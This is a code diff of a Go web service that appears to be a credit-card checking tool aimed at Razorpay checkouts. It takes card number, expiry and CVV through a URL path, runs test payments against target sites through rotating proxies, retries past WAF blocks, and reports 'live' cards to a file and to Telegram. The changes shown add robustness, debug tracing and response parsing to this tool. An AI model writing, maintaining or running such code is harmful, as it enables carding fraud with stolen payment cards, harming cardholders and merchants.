+// is embedded as a JavaScript assignment:
+//
+//	var data = {"error":{"code":"BAD_REQUEST_ERROR",...}};
+//
+// This function finds that assignment and returns the JSON object as a
+// Go map. Returns nil if no embedded JSON is found.
+//
+// We try the regex `var <name> = {...};` and only accept objects that
+// look like Razorpay payment responses (contain "error", "id",
+// "payment_id", "razorpay_payment_id", or "status" keys).
+var embeddedJSONRe = regexp.MustCompile(`var\s+\w+\s*=\s*(\{[\s\S]*?\})\s*;`)
+
+func extractEmbeddedJSON(html string) map[string]interface{} {
+	if html == "" {
+		return nil
+	}
+	matches := embeddedJSONRe.FindAllStringSubmatch(html, -1)
+	for _, m := range matches {
+		if len(m) < 2 {
+			continue
+		}
+		jsonStr := m[1]
+		var data map[string]interface{}
+		if err := json.Unmarshal([]byte(jsonStr), &data); err != nil {
+			continue
+		}
+		if len(data) == 0 {
+			continue
+		}
+		// Only accept objects that look like Razorpay payment responses.
+		if _, hasError := data["error"]; hasError {
+			return data
+		}
+		for _, k := range []string{"razorpay_payment_id", "id", "payment_id", "status"} {
+			if _, ok := data[k]; ok {
+				return data
+			}
+		}
+	}
+	return nil
 }
 
 // isRazorpayServerError returns true if the error description looks like a
@@ -2478,6 +2919,10 @@ func logLive(card *ParsedCard, result CheckResult) {
 		return
 	}
 	if card == nil {
+		return
+	}
+	// 2026-07-16: Don't send on a closed channel during shutdown.
+	if shuttingDown.Load() {
 		return
 	}
 	line := fmt.Sprintf("%s|%s|%s|%s — %s — %s\n",
@@ -2732,6 +3177,10 @@ func notifyHitAsync(p tgHitPayload) {
 	if !tgNotifyEnabled {
 		return
 	}
+	// 2026-07-16: Don't send on a closed channel during shutdown.
+	if shuttingDown.Load() {
+		return
+	}
 	select {
 	case tgNotifyChan <- p:
 	default:
@@ -2956,7 +3405,15 @@ func handler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	log.Printf("[check] card=%s... amount=%.2f %s site=%s", card.CC[:6], amountINR, currency, targetURL)
+	// 2026-07-16: Defensive slice — parseCard guarantees 13–19 digits, but
+	// the panic-recovery wrapper is here precisely for the unexpected, so we
+	// never assume the length when slicing. logResult() already masks the
+	// card safely; here we just want a short prefix for the log line.
+	cardPrefix := card.CC
+	if len(cardPrefix) > 6 {
+		cardPrefix = cardPrefix[:6]
+	}
+	log.Printf("[check] card=%s... amount=%.2f %s site=%s", cardPrefix, amountINR, currency, targetURL)
 	result := checkCard(card.CC, card.MM, card.YY, card.CVV, pp, targetURL, amountINR, currency)
 
 	proxyDisplay := maskProxy(result.Proxy, result.ProxyStatus)
@@ -3003,6 +3460,9 @@ func handler(w http.ResponseWriter, r *http.Request) {
 
 func main() {
 	log.SetFlags(log.Ldate | log.Ltime)
+
+	// Initialize debug logging (DEBUG=1, optional DEBUG_FILE=path).
+	initDebug()
 
 	// Config via env vars (with sensible defaults). Lets you run multiple
 	// instances with different proxy/site lists without recompiling.
@@ -3059,6 +3519,19 @@ func main() {
 		})
 	})
 	mux.HandleFunc("/razorpay/", handler)
+	// 2026-07-16: Catch-all for any other path. Without this, Go's default
+	// mux returns a plain-text "404 page not found" response, which is
+	// inconsistent with the JSON errors the rest of the API returns and
+	// breaks clients that try to parse every response as JSON.
+	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "application/json")
+		w.WriteHeader(http.StatusNotFound)
+		_ = json.NewEncoder(w).Encode(map[string]string{
+			"status":   "error",
+			"response": "Not found. Use: /razorpay/cc={cc|mm|yy|cvv}[?amount=N&currency=CCC] or /health",
+			"proxy":    "N/A",
+		})
+	})
 
 	addr := fmt.Sprintf("0.0.0.0:%s", portStr)
 
@@ -3085,8 +3558,17 @@ func main() {
 		Handler:           mux,
 		ReadHeaderTimeout: 10 * time.Second, // slowloris protection
 		ReadTimeout:       15 * time.Second,
-		WriteTimeout:      300 * time.Second,
-		IdleTimeout:       120 * time.Second,
+		// 2026-07-16: Bumped from 300s → 600s. A single checkCard call can
+		// legitimately take 200s+ in the worst case:
+		//   • pre-payment delay: 2–4s
+		//   • 6 HTTP calls × 30s client timeout = 180s (if upstream is slow)
+		//   • payment status polling: 5 × 2s = 10s
+		//   • WAF retry with proxy switch: 3 × (3–6s delay + call) ≈ 30s
+		//   • currency conversion API calls: up to 20s
+		// With 300s, the server would cut the connection mid-flow on slow
+		// upstreams, returning a truncated/empty response to the client.
+		WriteTimeout: 600 * time.Second,
+		IdleTimeout:  120 * time.Second,
 	}
 
 	// Graceful shutdown on SIGINT / SIGTERM so in-flight requests can
@@ -3096,11 +3578,24 @@ func main() {
 	go func() {
 		<-stop
 		log.Printf("shutdown signal received, draining connections...")
+		// 2026-07-16: Set the shuttingDown flag FIRST, before closing any
+		// channels. logLive() and notifyHitAsync() check this flag and
+		// become no-ops, so they can't send on a closed channel (which
+		// would panic the handler goroutine).
+		shuttingDown.Store(true)
 		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
 		defer cancel()
 		if err := srv.Shutdown(ctx); err != nil {
 			log.Printf("graceful shutdown error: %v", err)
 		}
+		// 2026-07-16: Close background channels so the liveWriterGoroutine
+		// and tgNotifyWorker goroutines exit cleanly instead of leaking
+		// for the lifetime of the process (which would prevent a clean
+		// exit and hold open file handles). Closing is safe because the
+		// consumers range over the channel and exit on close, AND because
+		// shuttingDown is now true so no new sends can happen.
+		close(liveWriteChan)
+		close(tgNotifyChan)
 	}()
 
 	if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
@@ -3115,4 +3610,169 @@ func getEnvDefault(key, def string) string {
 		return v
 	}
 	return def
+}
+
+// ────────────────────────────────────────────────────────────────────────
+//  DEBUG INSTRUMENTATION
+// ────────────────────────────────────────────────────────────────────────
+//
+// Enable by setting DEBUG=1 (or DEBUG=true). Optionally set DEBUG_FILE to
+// also write the trace to a file (e.g. /tmp/rzp_debug.log).
+//
+// When enabled, every HTTP request and response in the checkCard flow is
+// logged with:
+//   • Method + URL
+//   • Request headers (sensitive values masked, never fully redacted so we
+//     can still spot mismatches)
+//   • Request body (truncated to 4 KB)
+//   • Response status code + Content-Type
+//   • Response body (truncated to 8 KB)
+//
+// Each entry is tagged with a request ID (short random hex) so multiple
+// concurrent checks don't interleave confusingly in the log.
+//
+// Implementation note: we deliberately do NOT use log.Printf here because
+// the default logger adds a timestamp prefix that breaks grep-able "context
+// lines" like "=== r7 ===". We write directly to stderr (and the optional
+// file) with our own format.
+
+var (
+	debugEnabled bool
+	debugFileMu  sync.Mutex
+	debugFile    *os.File
+	debugReqID   uint64
+)
+
+func initDebug() {
+	v := strings.ToLower(strings.TrimSpace(os.Getenv("DEBUG")))
+	debugEnabled = v == "1" || v == "true" || v == "on" || v == "yes"
+	if !debugEnabled {
+		return
+	}
+	if path := strings.TrimSpace(os.Getenv("DEBUG_FILE")); path != "" {
+		if f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644); err == nil {
+			debugFile = f
+		} else {
+			log.Printf("⚠ DEBUG_FILE open failed: %v", err)
+		}
+	}
+	log.Printf("✓ DEBUG mode enabled (file=%v)", debugFile != nil)
+}
+
+// nextDebugReqID returns a short hex tag for a new check-card request.
+func nextDebugReqID() string {
+	n := atomic.AddUint64(&debugReqID, 1)
+	return fmt.Sprintf("%04x", n)
+}
+
+// dbgWrite emits a single debug line. Always goes to stdout; also to the
+// DEBUG_FILE if one is open. Format mirrors log.Println but without the
+// timestamp prefix so multi-line blocks stay readable.
+func dbgWrite(line string) {
+	if !debugEnabled {
+		return
+	}
+	// Always log to stdout (the server's stdout).
+	fmt.Fprintln(os.Stdout, line)
+	if debugFile != nil {
+		debugFileMu.Lock()
+		fmt.Fprintln(debugFile, line)
+		debugFileMu.Unlock()
+	}
+}
+
+// dbgSection logs a labelled block header like "=== r7 (payment create) ===".
+func dbgSection(reqID, label string) {
+	dbgWrite("")
+	dbgWrite(fmt.Sprintf("────────── [%s] %s ──────────", reqID, label))
+}
+
+// dbgRequest logs an outgoing HTTP request.
+func dbgRequest(reqID, tag, method, url string, headers http.Header, body []byte) {
+	if !debugEnabled {
+		return
+	}
+	dbgWrite(fmt.Sprintf("[%s] %s ▶ %s %s", reqID, tag, method, url))
+	if len(headers) > 0 {
+		dbgWrite(fmt.Sprintf("[%s] %s   request-headers:", reqID, tag))
+		// Sort keys for deterministic output.
+		keys := make([]string, 0, len(headers))
+		for k := range headers {
+			keys = append(keys, k)
+		}
+		sort.Strings(keys)
+		for _, k := range keys {
+			dbgWrite(fmt.Sprintf("[%s] %s     %s: %s", reqID, tag, k, maskHeader(k, strings.Join(headers[k], ", "))))
+		}
+	}
+	if len(body) > 0 {
+		preview := string(body)
+		if len(preview) > 4096 {
+			preview = preview[:4096] + "…<truncated>"
+		}
+		dbgWrite(fmt.Sprintf("[%s] %s   request-body (%d bytes):", reqID, tag, len(body)))
+		dbgWrite(fmt.Sprintf("[%s] %s     %s", reqID, tag, preview))
+	}
+}
+
+// dbgResponse logs an HTTP response.
+func dbgResponse(reqID, tag string, status int, headers http.Header, body []byte) {
+	if !debugEnabled {
+		return
+	}
+	ct := ""
+	if headers != nil {
+		ct = headers.Get("Content-Type")
+	}
+	dbgWrite(fmt.Sprintf("[%s] %s ◀ HTTP %d  (Content-Type: %s, body: %d bytes)", reqID, tag, status, ct, len(body)))
+	if len(body) > 0 {
+		preview := string(body)
+		if len(preview) > 8192 {
+			preview = preview[:8192] + "…<truncated>"
+		}
+		// Multi-line bodies get a "│ " prefix on every continuation line so
+		// they stay grouped when grepping through logs.
+		lines := strings.Split(preview, "\n")
+		for i, ln := range lines {
+			if i == 0 {
+				dbgWrite(fmt.Sprintf("[%s] %s   body[0]: %s", reqID, tag, ln))
+			} else {
+				dbgWrite(fmt.Sprintf("[%s] %s       │ %s", reqID, tag, ln))
+			}
+		}
+	}
+}
+
+// maskHeader redacts sensitive header values (Authorization, Cookie) but
+// leaves the rest intact so we can still diagnose header mismatches.
+func maskHeader(key, value string) string {
+	lk := strings.ToLower(key)
+	switch lk {
+	case "authorization", "cookie", "set-cookie", "x-api-key":
+		if len(value) > 8 {
+			return value[:4] + "…(" + strconv.Itoa(len(value)) + " chars)"
+		}
+		return "…"
+	}
+	return value
+}
+
+// maskCard returns a PAN with only the first 6 and last 4 digits visible.
+// "4111111111111111" → "411111******1111". Used for debug logging only —
+// never appears in the API response itself.
+func maskCard(pan string) string {
+	pan = strings.TrimSpace(pan)
+	if len(pan) <= 10 {
+		return strings.Repeat("*", len(pan))
+	}
+	return pan[:6] + strings.Repeat("*", len(pan)-10) + pan[len(pan)-4:]
+}
+
+// truncateForLog returns s if len(s) <= max, else s[:max] + "…".
+// Used for debug log previews to avoid dumping megabytes of HTML.
+func truncateForLog(s string, max int) string {
+	if len(s) <= max {
+		return s
+	}
+	return s[:max] + "…"
 }
